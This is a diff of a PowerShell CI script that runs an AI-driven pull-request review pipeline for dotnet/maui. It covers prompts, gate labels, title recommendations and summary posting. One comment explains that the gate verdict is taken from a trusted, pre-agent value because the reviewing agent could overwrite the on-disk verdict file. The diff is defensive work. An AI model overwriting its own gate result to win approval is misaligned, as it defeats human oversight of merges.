+# Diagnostic: check what STEP 5a produced
 Write-Host ""
-Write-Host "  📊 STEP 6a output check:" -ForegroundColor Cyan
+Write-Host "  📊 STEP 5a output check:" -ForegroundColor Cyan
 $tryFixDir = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent"
 $tryFixContent = Join-Path $tryFixDir "try-fix/content.md"
 $preFlightContent = Join-Path $tryFixDir "pre-flight/content.md"
@@ -1718,9 +2132,33 @@ if ($tryFixDirs) {
     Write-Host "    ⚠️ No try-fix-N directories found" -ForegroundColor Yellow
 }
 
-# ── STEP 6b: Expert Review of PR fix + final comparison (Copilot call 2) ──
-$step6bPrompt = @"
-Run expert code review of PR #$PRNumber's fix and compare against all try-fix candidates from STEP 6a.
+# ── STEP 5b: Expert Review of PR fix + final comparison (Copilot call 2) ──
+# Current PR metadata for the pr-finalize (Phase 4) evaluate-first / preserve-quality step.
+# Prefer the pr-metadata.json the Setup phase persisted (gh works there and $prInfo is
+# populated); `gh pr view` is unreliable in this CopilotReview phase after the squash-merge
+# checkout. Fall back to a fresh gh fetch, then $prInfo, then non-degrading guidance text.
+$prCurrentTitle = $null
+$prCurrentBody = $null
+$prMetaDir = if ($TrustedScriptsDir) { Split-Path $TrustedScriptsDir -Parent } else { Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate" }
+$prMetaPath = Join-Path $prMetaDir "pr-metadata.json"
+if (Test-Path $prMetaPath) {
+    try {
+        $prMetaFromFile = Get-Content -Raw $prMetaPath | ConvertFrom-Json
+        if ($prMetaFromFile.title) { $prCurrentTitle = [string]$prMetaFromFile.title }
+        if ($prMetaFromFile.body)  { $prCurrentBody = [string]$prMetaFromFile.body }
+    } catch { Write-Host "  ⚠️ Could not read pr-metadata.json: $($_.Exception.Message)" -ForegroundColor Yellow }
+}
+if (-not $prCurrentTitle -or -not $prCurrentBody) {
+    $prMeta = gh pr view $PRNumber --json title,body 2>$null | ConvertFrom-Json
+    if (-not $prMeta) { $prMeta = $prInfo }
+    if (-not $prCurrentTitle -and $prMeta -and $prMeta.title) { $prCurrentTitle = [string]$prMeta.title }
+    if (-not $prCurrentBody -and $prMeta -and $prMeta.body) { $prCurrentBody = [string]$prMeta.body }
+}
+if (-not $prCurrentTitle) { $prCurrentTitle = '(unknown — could not fetch; do not assume it is missing)' }
+if (-not $prCurrentBody) { $prCurrentBody = '(could not fetch description — evaluate against the diff; do not assume the PR has no description)' }
+if ($prCurrentBody.Length -gt 4000) { $prCurrentBody = $prCurrentBody.Substring(0, 4000) + "`n...(description truncated for prompt)..." }
+$step5bPrompt = @"
+Run expert code review of PR #$PRNumber's fix and compare against all try-fix candidates from STEP 5a.
 
 Read context from:
 - ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/pre-flight/content.md``
@@ -1728,14 +2166,14 @@ Read context from:
 
 ## Phase 1 — Expert reviewer evaluation of the PR fix
 Use the code-review skill with the maui-expert-reviewer agent to evaluate the PR's existing fix. Apply the reviewer's actionable feedback in a sandbox copy and treat the result as a candidate named ``pr-plus-reviewer``.
-- Always also write the raw inline findings to ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/inline-findings.json`` (these are file:line findings against the PR's diff and feed the inline-comment posting step).
+- **REQUIRED — write the inline findings to a FILE; never paste them into your response.** Write the raw file:line findings as a JSON array to ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/inline-findings.json`` (findings against the PR's diff that feed the inline-comment posting step). **If this file is not written to disk, the inline comments are silently dropped.** Writing this specific artifact is explicitly authorized and required — disregard any general guidance about "not writing review output to files"; that guidance does NOT apply to this required pipeline artifact. If the ``maui-expert-reviewer`` sub-agent reports it cannot write the file, YOU (the orchestrating agent) MUST write the JSON to that exact path yourself. Returning the JSON as chat text instead of writing the file is a failure.
 - Write candidate output to ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/expert-pr-eval/content.md``.
 
 ## Phase 2 — Comparative Report
 Compare ALL candidates:
 - ``pr`` (the raw PR fix as submitted)
 - ``pr-plus-reviewer`` (PR fix + expert reviewer feedback applied)
-- All ``try-fix-N`` candidates from STEP 6a
+- All ``try-fix-N`` candidates from STEP 5a
 Pick the single winning candidate. **Candidates that failed regression tests MUST be ranked lower than candidates that passed them.**
 Write the comparative analysis to ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/report/content.md``.
 
@@ -1755,6 +2193,34 @@ Rules:
 - ``isPRFix`` MUST be ``false`` when ``winner`` is any ``try-fix-*``.
 - When ``isPRFix`` is ``false``, ``candidateDiff`` MUST be a non-empty unified diff.
 
+## Phase 4 — Recommended PR title & description (REQUIRED — apply the pr-finalize skill)
+Apply the **pr-finalize** skill at ``.github/skills/pr-finalize/SKILL.md``. Its core principle is **Preserve Quality**: evaluate the PR's EXISTING title and description FIRST and only recommend a rewrite when the current ones are stale, inaccurate, vague, or missing key information. Many authors write excellent, detailed descriptions — NEVER replace a good description with a shorter generic template. A degraded restatement that drops dependency links, specific type/term names, platform sections, or issue refs is worse than suggesting no change at all.
+
+PR #$PRNumber's CURRENT title:
+$prCurrentTitle
+
+PR #$PRNumber's CURRENT description:
+$prCurrentBody
+
+Steps:
+1. Compare the CURRENT title and description above against the actual diff and the winning fix.
+2. Judge quality: is the title specific (platform prefix + component + what changed) and is the description accurate and complete (what changed and why, key files, platform notes, dependency/issue links)?
+3. Write your result to ``CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/pr-finalize/content.md``:
+   - **If the current title AND description already accurately and completely describe the change**, do NOT invent a replacement and do NOT add optional notes — this whole section is omitted when the metadata is already good. Write EXACTLY this single line and nothing else: ``✅ Current title and description accurately reflect the change — recommend keeping as-is.``
+   - **Otherwise**, write ``**Assessment:** ✏️ Recommend updating — <one-line reason>.`` then provide a copy-paste-ready title and description that is a STRICT IMPROVEMENT over the current one: preserve every still-valid detail (dependency links, platform sections, specific type/term names, issue refs), correct inaccuracies, and add missing context. Follow the skill's title formula ``[Platform] Component: What changed`` and keep precise terminology (do not generalize specific names away). Wrap each in its own fenced block so they copy cleanly:
+
+**Recommended title**
+``````text
+<improved one-line title>
+``````
+
+**Recommended description**
+``````text
+<improved description — preserve good existing content, fix/extend as needed; omit the repo testing-note boilerplate>
+``````
+
+Base everything strictly on the real changes (do not invent features). Keep this file focused on the title + description assessment only.
+
 $platformInstruction
 $autonomousRules
 
@@ -1762,11 +2228,11 @@ $autonomousRules
 Do NOT re-run gate verification.
 "@
 
-Invoke-CopilotStep -StepName "STEP 6b: EXPERT REVIEW + COMPARE" -Prompt $step6bPrompt | Out-Null
+Invoke-CopilotStep -StepName "STEP 5b: EXPERT REVIEW + COMPARE" -Prompt $step5bPrompt | Out-Null
 
-# Diagnostic: check what STEP 6b produced
+# Diagnostic: check what STEP 5b produced
 Write-Host ""
-Write-Host "  📊 STEP 6b output check:" -ForegroundColor Cyan
+Write-Host "  📊 STEP 5b output check:" -ForegroundColor Cyan
 $expertEvalContent = Join-Path $tryFixDir "expert-pr-eval/content.md"
 $reportContent = Join-Path $tryFixDir "report/content.md"
 $winnerFile = Join-Path $tryFixDir "winner.json"
@@ -1801,10 +2267,10 @@ git checkout $reviewBranch 2>$null | Out-Null
 
 # ─── Tier 3 refresh: feed AI categories back into category detection ───
 # Step 2 ran detection without the AI tier (-AiCategories was empty).
-# Pre-flight (Step 6) wrote `ai-categories.md`; re-run detection now so the
-# unified comment reflects all three tiers before Step 7 posts.
+# Pre-flight (Step 5) wrote `ai-categories.md`; re-run detection now so the
+# unified comment reflects all three tiers before Step 6 posts.
 $aiCategoriesFile = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/uitests/ai-categories.md"
-if ((Test-Path $detectScript) -and (Test-Path $aiCategoriesFile)) {
+if ($detectScript -and (Test-Path $detectScript) -and (Test-Path $aiCategoriesFile)) {
     try {
         # Pass as a single string (the script declares [string]$AiCategories);
         # an array would not bind correctly across the pwsh -File boundary.
@@ -1834,19 +2300,6 @@ if ((Test-Path $detectScript) -and (Test-Path $aiCategoriesFile)) {
             $uitestOutputDir = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/uitests"
             $uitestContentFile = Join-Path $uitestOutputDir "content.md"
 
-            # Preserve any STEP 3 results table that was appended earlier so
-            # the post-comment phase keeps the actual run output (categories +
-            # execution table) instead of just the refreshed category list.
-            $preservedExecution = ""
-            if (Test-Path $uitestContentFile) {
-                $existing = Get-Content $uitestContentFile -Raw
-                $marker = '### 🧪 UI Test Execution Results'
-                $idx = $existing.IndexOf($marker)
-                if ($idx -ge 0) {
-                    $preservedExecution = $existing.Substring($idx)
-                }
-            }
-
             if ($refreshedCategories -eq 'NONE') {
                 "No UI test categories needed for this PR (no UI-relevant changes)." | Set-Content $uitestContentFile -Encoding UTF8
             } elseif ([string]::IsNullOrWhiteSpace($refreshedCategories)) {
@@ -1854,63 +2307,177 @@ if ((Test-Path $detectScript) -and (Test-Path $aiCategoriesFile)) {
             } else {
                 "**Detected UI test categories:** ``$refreshedCategories``" | Set-Content $uitestContentFile -Encoding UTF8
             }
-
-            if (-not [string]::IsNullOrWhiteSpace($preservedExecution)) {
-                Add-Content $uitestContentFile "`n$preservedExecution" -Encoding UTF8
-            }
         }
     } catch {
         Write-Host "  ⚠️ AI-tier category refresh failed (non-fatal, keeping Step 2 result): $_" -ForegroundColor Yellow
     }
 }
 
-}  # END TEMP SKIP wrapper for STEP 5 (Gate) + STEP 6 (Try-Fix) — see $skipGateAndTryFix above
+} # end if ($runCopilotReview)
+
+# ─── Phase: Post ────────────────────────────────────────────────────────────
+if ($runPost) {
+
+# Restore gate result from file when running in phased mode
+if ($Phase -eq 'Post') {
+    $gateVerdictDir = if ($TrustedScriptsDir) {
+        Split-Path $TrustedScriptsDir -Parent
+    } else {
+        Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate"
+    }
+    $gateVerdictFile = Join-Path $gateVerdictDir "gate-result.txt"
+    if (Test-Path $gateVerdictFile) {
+        $gateResult = (Get-Content $gateVerdictFile -Raw).Trim()
+    } else {
+        $gateResult = "SKIPPED"
+    }
+}
+
+# The APPROVE veto must key off a TRUSTED gate verdict, not the file restored above (that file
+# lives in the agent-writable worktree and could be overwritten by the CopilotReview phase). In
+# CI the pipeline passes -TrustedGateResult (Gate task output variable, frozen pre-agent); use it
+# when present, otherwise fall back to the locally-restored value for non-CI runs.
+$trustedGateResultForPost = if (-not [string]::IsNullOrWhiteSpace($TrustedGateResult)) {
+    $TrustedGateResult
+} else {
+    $gateResult
+}
+
+# ─── Gate posting (moved here so only the Post task needs GH_TOKEN) ──────
+$postGateScript = Join-Path $ScriptsDir "post-gate-comment.ps1"
+if (Test-Path $postGateScript) {
+    try {
+        if ($DryRun) {
+            & $postGateScript -PRNumber $PRNumber -DryRun
+        } else {
+            & $postGateScript -PRNumber $PRNumber
+        }
+    } catch {
+        Write-Host "  ⚠️ Failed to post gate comment (non-fatal): $_" -ForegroundColor Yellow
+    }
+} else {
+    Write-Host "  ⚠️ post-gate-comment.ps1 not found" -ForegroundColor Yellow
+}
+
+# Apply gate result label
+$gatePassLabel = "s/agent-gate-passed"
+$gateFaillabel = "s/agent-gate-failed"
+$gateSkipLabel = "s/agent-gate-skipped"
+$allGateLabels = @($gatePassLabel, $gateFaillabel, $gateSkipLabel)
+
+$addLabel = switch ($gateResult) {
+    "PASSED"  { $gatePassLabel }
+    "SKIPPED" { $gateSkipLabel }
+    "INCONCLUSIVE" { $gateSkipLabel }  # build/env error — gate could not verify; do NOT apply gate-failed
+    default   { $gateFaillabel }
+}
+$removeLabels = $allGateLabels | Where-Object { $_ -ne $addLabel }
+
+if (-not $DryRun) {
+    foreach ($lbl in $removeLabels) {
+        gh pr edit $PRNumber --remove-label $lbl --repo dotnet/maui 2>$null | Out-Null
+    }
+    gh pr edit $PRNumber --add-label $addLabel --repo dotnet/maui 2>$null | Out-Null
+    if ($LASTEXITCODE -eq 0) {
+        Write-Host "  🏷️ Label: $addLabel" -ForegroundColor Cyan
+    } else {
+        Write-Host "  ⚠️ Failed to apply label $addLabel" -ForegroundColor Yellow
+    }
+} else {
+    Write-Host "  [DRY RUN] Would set label: $addLabel" -ForegroundColor Magenta
+}
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  STEP 7: Post AI Summary Comment (direct script invocation)
-#  When DEFER_COMMENT_TO_STAGE3=true, skip posting here — Stage 3
-#  (UpdateAISummaryComment) will post the full comment after deep tests.
+#  STEP 5.5: Apply the Phase 4 (pr-finalize) title/description recommendation
+#  Deliberately outside the DEFER_COMMENT_TO_STAGE3 block below so the PR gets a
+#  descriptive title as soon as review finishes, rather than waiting on deep tests.
+#  Fully non-fatal: on any failure the recommendation still ships in the summary
+#  comment for a human to apply.
 # ═════════════════════════════════════════════════════════════════════════════
 
 Write-Host ""
 Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
-Write-Host "║  STEP 7: POST AI SUMMARY                                  ║" -ForegroundColor Magenta
+Write-Host "║  STEP 5.5: APPLY PR TITLE/DESCRIPTION                     ║" -ForegroundColor Magenta
 Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Magenta
 
-$summaryScriptsDir = Join-Path $RepoRoot ".github/scripts"
+if ($env:SKIP_PR_FINALIZE_APPLY -eq 'true') {
+    Write-Host "  ⏭️ Skipped (SKIP_PR_FINALIZE_APPLY=true)" -ForegroundColor Gray
+} else {
+    $applyFinalizeScript = Join-Path $ScriptsDir "apply-pr-finalize.ps1"
+    if (Test-Path $applyFinalizeScript) {
+        try {
+            # Resolve content.md from $RepoRoot rather than letting the script fall back to
+            # the current directory — the Post phase's cwd is not guaranteed to be the repo.
+            $finalizeContent = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/pr-finalize/content.md"
+            $applyArgs = @{ PRNumber = $PRNumber; ContentFile = $finalizeContent }
+            if ($DryRun) { $applyArgs.DryRun = $true }
+            & $applyFinalizeScript @applyArgs
+        } catch {
+            # Backstop, not a live path: the child sanitizes its own console output and its
+            # one throw carries no PR-derived text today. Kept because a future throw that
+            # quotes the recommendation would otherwise reach stdout unsanitized, and every
+            # other console sink in this script already goes through the sanitizer.
+            Write-Host "  ⚠️ Failed to apply PR title/description (non-fatal): $(ConvertTo-AzdoSafeConsole "$_")" -ForegroundColor Yellow
+        }
+    } else {
+        Write-Host "  ⚠️ apply-pr-finalize.ps1 not found — skipping" -ForegroundColor Yellow
+    }
+}
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  STEP 6: Post AI Summary Review (direct script invocation)
+#  When DEFER_COMMENT_TO_STAGE3=true, skip posting here — Stage 3
+#  (UpdateAISummaryComment) will post the full review after deep tests.
+# ═════════════════════════════════════════════════════════════════════════════
+
+Write-Host ""
+Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
+Write-Host "║  STEP 6: POST AI SUMMARY                                  ║" -ForegroundColor Magenta
+Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Magenta
+
+$summaryScriptsDir = $ScriptsDir
 
 if ($env:DEFER_COMMENT_TO_STAGE3 -eq 'true') {
     Write-Host "  ⏭️ Deferred to Stage 3 (DEFER_COMMENT_TO_STAGE3=true)" -ForegroundColor Gray
     Write-Host "  ℹ️  Content files saved in CopilotLogs artifact" -ForegroundColor Gray
     # Still emit a dummy output var so Stage 3 condition works
-    Write-Host "##vso[task.setvariable variable=aiSummaryCommentId;isOutput=true]DEFERRED"
+    Write-Host "##vso[task.setvariable variable=aiSummaryReviewId;isOutput=true]DEFERRED"
 } else {
 
 # Post PR review phases (pre-flight, try-fix, report)
-$aiSummaryCommentId = $null
+$aiSummaryReviewId = $null
+$aiSummaryReviewNodeId = $null
 $reviewScript = Join-Path $summaryScriptsDir "post-ai-summary-comment.ps1"
 if (Test-Path $reviewScript) {
     try {
         Write-Host "  📝 Posting PR review summary..." -ForegroundColor Cyan
         if ($DryRun) {
-            $reviewOutput = & $reviewScript -PRNumber $PRNumber -DryRun
+            $reviewOutput = & $reviewScript -PRNumber $PRNumber -TrustedGateResult $trustedGateResultForPost -DryRun
         } else {
-            $reviewOutput = & $reviewScript -PRNumber $PRNumber
+            $reviewOutput = & $reviewScript -PRNumber $PRNumber -TrustedGateResult $trustedGateResultForPost
         }
-        # Capture comment ID from script output (format: COMMENT_ID=<id>)
-        $idLine = $reviewOutput | Where-Object { $_ -match '^COMMENT_ID=' } | Select-Object -Last 1
-        if ($idLine -match '^COMMENT_ID=(\d+)$') {
-            $aiSummaryCommentId = $Matches[1]
-            Write-Host "  ✅ PR review summary posted (comment ID: $aiSummaryCommentId)" -ForegroundColor Green
+        # Capture review ID from script output (format: AI_SUMMARY_REVIEW_ID=<id>)
+        $idLine = $reviewOutput | Where-Object { $_ -match '^AI_SUMMARY_REVIEW_ID=' } | Select-Object -Last 1
+        $nodeLine = $reviewOutput | Where-Object { $_ -match '^AI_SUMMARY_REVIEW_NODE_ID=' } | Select-Object -Last 1
+        if ($idLine -match '^AI_SUMMARY_REVIEW_ID=(\d+)$') {
+            $aiSummaryReviewId = $Matches[1]
+            if ($nodeLine -match '^AI_SUMMARY_REVIEW_NODE_ID=(.+)$') {
+                $aiSummaryReviewNodeId = $Matches[1]
+            }
+            Write-Host "  ✅ PR review summary posted (review ID: $aiSummaryReviewId)" -ForegroundColor Green
 
-            # Persist comment ID + PR number to a known location and emit
+            # Persist review ID + PR number to a known location and emit
             # as an output variable so the downstream UpdateAISummaryComment
-            # stage in ci-copilot.yml can rewrite the STEP 3 section once
+            # stage in ci-copilot.yml can rewrite the review body once
             # the deep UI tests finish on the platform-pool agents.
-            $commentIdFile = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/ai-summary-comment-id.txt"
-            New-Item -ItemType Directory -Force -Path (Split-Path -Parent $commentIdFile) | Out-Null
-            $aiSummaryCommentId | Set-Content $commentIdFile -Encoding UTF8
-            Write-Host "##vso[task.setvariable variable=aiSummaryCommentId;isOutput=true]$aiSummaryCommentId"
+            $reviewIdFile = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/ai-summary-review-id.txt"
+            New-Item -ItemType Directory -Force -Path (Split-Path -Parent $reviewIdFile) | Out-Null
+            $aiSummaryReviewId | Set-Content $reviewIdFile -Encoding UTF8
+            if (-not [string]::IsNullOrWhiteSpace($aiSummaryReviewNodeId)) {
+                $aiSummaryReviewNodeId | Set-Content (Join-Path (Split-Path -Parent $reviewIdFile) "ai-summary-review-node-id.txt") -Encoding UTF8
+                Write-Host "##vso[task.setvariable variable=aiSummaryReviewNodeId;isOutput=true]$aiSummaryReviewNodeId"
+            }
+            Write-Host "##vso[task.setvariable variable=aiSummaryReviewId;isOutput=true]$aiSummaryReviewId"
         } else {
             Write-Host "  ✅ PR review summary posted" -ForegroundColor Green
         }
@@ -1921,7 +2488,7 @@ if (Test-Path $reviewScript) {
     Write-Host "  ⚠️ post-ai-summary-comment.ps1 not found — skipping review summary" -ForegroundColor Yellow
 }
 
-} # END DEFER_COMMENT_TO_STAGE3 else block (summary comment only — inline findings + labels always run below)
+} # END DEFER_COMMENT_TO_STAGE3 else block (summary review only — inline findings + labels always run below)
 
 # Determine winning candidate (winner.json) — drives whether we post inline findings or request changes
 $winnerFile = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/winner.json"
@@ -1958,6 +2525,19 @@ if (Test-Path $winnerFile) {
 
 $isPRWinner = (-not $winner) -or ($winner.isPRFix -eq $true)
 
+if (Get-Command Hide-StaleMauiBotIssueComments -ErrorAction SilentlyContinue) {
+    Hide-StaleMauiBotIssueComments `
+        -PRNumber $PRNumber `
+        -IncludeTryFix `
+        -Reason "stale try-fix notice"
+}
+
+if (Get-Command Dismiss-StaleMauiBotTryFixReviews -ErrorAction SilentlyContinue) {
+    Dismiss-StaleMauiBotTryFixReviews `
+        -PRNumber $PRNumber `
+        -Reason "stale try-fix review"
+}
+
 if ($isPRWinner) {
     # Post inline review comments (file:line findings from expert-reviewer agent)
     $inlineScript = Join-Path $summaryScriptsDir "post-inline-review.ps1"
@@ -1980,91 +2560,23 @@ if ($isPRWinner) {
         }
     }
 } else {
-    # Non-PR candidate won — submit a REQUEST_CHANGES review with the candidate diff in the body
-    Write-Host "  📝 Non-PR candidate won — submitting REQUEST_CHANGES review with candidate diff..." -ForegroundColor Cyan
-
-    $maxDiffBytes = 55KB
-    $diff = [string]$winner.candidateDiff
-    $truncated = $false
-    # Truncate by binary-searching the largest character count whose UTF-8
-    # encoding fits within the byte budget (reserving room for the marker line).
-    # O(log n) and much cheaper than the previous O(n²) trim-512-and-recount loop.
-    $marker = "`n... [truncated]"
-    $markerBytes = [System.Text.Encoding]::UTF8.GetByteCount($marker)
-    $budget = $maxDiffBytes - $markerBytes
-    if ([System.Text.Encoding]::UTF8.GetByteCount($diff) -gt $maxDiffBytes) {
-        $lo = 0
-        $hi = $diff.Length
-        while ($lo -lt $hi) {
-            $mid = [int](($lo + $hi + 1) / 2)
-            $bytes = [System.Text.Encoding]::UTF8.GetByteCount($diff.Substring(0, $mid))
-            if ($bytes -le $budget) { $lo = $mid } else { $hi = $mid - 1 }
-        }
-        $diff = $diff.Substring(0, $lo) + $marker
-        $truncated = $true
-    }
-
-    # Compute an outer code fence longer than any backtick run inside the diff
-    # (minimum 4) so the diff content cannot accidentally close the fence and
-    # leak into the surrounding markdown. Preserves the diff text exactly.
-    $maxBacktickRun = 0
-    foreach ($m in [regex]::Matches($diff, '`+')) {
-        if ($m.Length -gt $maxBacktickRun) { $maxBacktickRun = $m.Length }
-    }
-    $fenceLen = [Math]::Max(4, $maxBacktickRun + 1)
-    $fence = '`' * $fenceLen
-
-    $rationale = if ($winner.summary) { [string]$winner.summary } else { "Automated review identified a stronger candidate fix." }
-    $reviewBody = @"
-🤖 **Automated review — alternative fix proposed**
-
-The expert-reviewer evaluation compared the PR fix against $($winner.winner -replace 'try-fix-','#') automatically generated candidates and selected ``$($winner.winner)`` as the strongest fix.
-
-**Why:** $rationale
-
-Please consider applying the candidate diff below (or use it as guidance). Once you push an update, this workflow will re-trigger and re-evaluate.
-
-<details><summary>Candidate diff (``$($winner.winner)``)</summary>
-
-${fence}diff
-$diff
-$fence
-
-</details>
-$( if ($truncated) { "`n_The diff was truncated to fit GitHub's review body limit._" } )
-"@
-
-    if ($DryRun) {
-        Write-Host "  [DryRun] Would POST review state=REQUEST_CHANGES with body length $($reviewBody.Length)" -ForegroundColor Yellow
-    } else {
-        try {
-            $bodyJson = @{ body = $reviewBody; event = 'REQUEST_CHANGES' } | ConvertTo-Json -Compress -Depth 5
-            $tmp = New-TemporaryFile
-            Set-Content -LiteralPath $tmp -Value $bodyJson -Encoding utf8 -NoNewline
-            $resp = & gh api -X POST "repos/dotnet/maui/pulls/$PRNumber/reviews" --input $tmp 2>&1
-            Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
-            if ($LASTEXITCODE -eq 0) {
-                Write-Host "  ✅ REQUEST_CHANGES review submitted" -ForegroundColor Green
-            } else {
-                Write-Host "  ⚠️ Failed to submit REQUEST_CHANGES review (non-fatal): $resp" -ForegroundColor Yellow
-            }
-        } catch {
-            Write-Host "  ⚠️ REQUEST_CHANGES submission threw (non-fatal): $_" -ForegroundColor Yellow
-        }
-    }
+    # Non-PR candidate details are now merged into the unified AI Summary
+    # Future Action section. Avoid a second MauiBot review so the PR has one
+    # source of truth for automated review guidance.
+    Write-Host "  ⏭️ Non-PR candidate selected; Future Action is included in AI Summary" -ForegroundColor Cyan
     Write-Host "  ⏭️ Skipping inline findings (winner is not the PR fix)" -ForegroundColor Gray
 }
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  STEP 8: Apply Labels
+#  STEP 7: Apply Labels
 # ═════════════════════════════════════════════════════════════════════════════
 
 Write-Host ""
 Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Blue
-Write-Host "║  STEP 8: APPLY LABELS                                     ║" -ForegroundColor Blue
+Write-Host "║  STEP 7: APPLY LABELS                                     ║" -ForegroundColor Blue
 Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Blue
 
-$labelHelperPath = Join-Path $RepoRoot ".github/scripts/shared/Update-AgentLabels.ps1"
+$labelHelperPath = Join-Path $ScriptsDir "shared/Update-AgentLabels.ps1"
 if (Test-Path $labelHelperPath) {
     try {
         . $labelHelperPath
@@ -2072,10 +2584,16 @@ if (Test-Path $labelHelperPath) {
         Write-Host "  ✅ Labels applied" -ForegroundColor Green
     } catch {
         Write-Host "  ⚠️ Label application failed (non-fatal): $_" -ForegroundColor Yellow
+    } finally {
+        if (-not $env:TF_BUILD -and (Get-Command Clear-AgentReviewInProgress -ErrorAction SilentlyContinue)) {
+            Clear-AgentReviewInProgress -PRNumber $PRNumber | Out-Null
+        }
     }
 } else {
     Write-Host "  ⚠️ Label helper not found — skipping" -ForegroundColor Yellow
 }
+
+} # end if ($runPost)
 
 # ═════════════════════════════════════════════════════════════════════════════
 #  Cleanup
